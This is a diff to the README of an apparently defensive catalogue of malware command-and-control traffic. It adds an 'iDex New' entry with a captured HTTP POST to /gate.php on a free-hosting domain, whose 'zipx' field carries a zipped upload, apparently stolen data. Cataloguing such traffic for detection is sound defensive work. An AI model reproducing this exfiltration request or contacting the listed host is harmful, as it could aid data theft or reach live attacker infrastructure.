@@ -1674,6 +1674,19 @@ Idle
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex2.png "iDex")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex3.png "iDex")
 
+#### iDex New
+~~~
+POST /gate.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: max099801.000webhostapp.com
+Content-Length: 936413
+Expect: 100-continue
+Connection: Keep-Alive
+
+zipx=UEsDBBQAAAgIALOmj
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex-new.png "iDex New")
+
 #### Imminent RAT
 ~~~
 00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
